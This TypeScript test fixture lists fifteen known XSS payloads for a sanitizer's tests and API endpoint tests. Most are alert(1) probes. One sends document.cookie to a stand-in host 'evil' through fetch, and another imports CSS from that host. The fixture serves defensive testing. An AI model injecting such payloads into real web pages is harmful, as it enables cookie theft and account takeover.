/** Known XSS payloads, shared so the sanitizer's tests and the API's endpoint tests try the same inputs on every user-text surface. */
export const XSS_PAYLOADS: readonly string[] = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  "'><img src=x onerror=alert(1)>",
  '<svg/onload=alert(1)>',
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<body onload=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
  '<style>@import"http://evil";</style>',
  '<script>fetch("https://evil/"+document.cookie)</script>',
  'javascript:/*--></title></style></textarea></script><svg onload=alert(1)>',
];
